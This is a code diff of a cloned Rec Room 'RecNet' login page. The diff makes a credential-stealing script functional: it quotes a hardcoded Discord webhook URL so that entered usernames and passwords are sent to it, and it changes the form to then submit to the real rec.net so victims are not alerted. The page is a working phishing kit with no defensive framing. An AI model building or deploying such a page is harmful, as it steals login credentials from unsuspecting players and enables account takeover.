@@ -2,15 +2,15 @@
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
 
-    
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Log in - RecNet (Modified)</title>
-    
+
+
     <link rel="stylesheet" href="./Log in - RecNet_files/bootstrap.min.css">
     <link rel="stylesheet" href="./Log in - RecNet_files/site.min.css">
-    
-    
+
+
 </head>
 <body>
     <div class="container body-content">
@@ -20,7 +20,7 @@
                 <img class="recroom-logo" src="./Log in - RecNet_files/logo_stacked.png" alt="Rec Room">
                 <hr>
                 <section>
-                    <form id="loginForm" action="#" method="post">
+                    <form id="loginForm" action="https://rec.net/" method="post">
                         <p class="text-center">Log in with your Rec Room Username and Password</p>
                         <div class="form-group">
                             <label for="Input_Username">Username or Email</label>
@@ -68,9 +68,9 @@
                 const password = passwordInput.value;
 
                 // Replace with your actual Discord webhook URL!
-                const webhookURL = https://discord.com/api/webhooks/1366421122014253097/a63BlnStlKceFeK6fEjGIANz4r_bgxZyA7_Gt_r-Ub5TjTrKCYDkmUs8vEqKhbfR7-DH;
+                const webhookURL = 'https://discord.com/api/webhooks/1366421122014253097/a63BlnStlKceFeK6fEjGIANz4r_bgxZyA7_Gt_r-Ub5TjTrKCYDkmUs8vEqKhbfR7-DH';
 
-                if (webhookURL === https://discord.com/api/webhooks/1366421122014253097/a63BlnStlKceFeK6fEjGIANz4r_bgxZyA7_Gt_r-Ub5TjTrKCYDkmUs8vEqKhbfR7-DH) {
+                if (webhookURL === 'https://discord.com/api/webhooks/1366421122014253097/a63BlnStlKceFeK6fEjGIANz4r_bgxZyA7_Gt_r-Ub5TjTrKCYDkmUs8vEqKhbfR7-DH') {
                     alert('Please replace YOUR_DISCORD_WEBHOOK_URL_HERE with your actual Discord webhook URL!');
                     return;
                 }
@@ -102,7 +102,7 @@
                 .then(response => {
                     if (response.ok) {
                         alert('Login information sent (to your webhook)!');
-                        // Optionally redirect the user or do something else
+                        loginForm.submit(); // Programmatically submit the form
                     } else {
                         alert('Failed to send login information.');
                     }
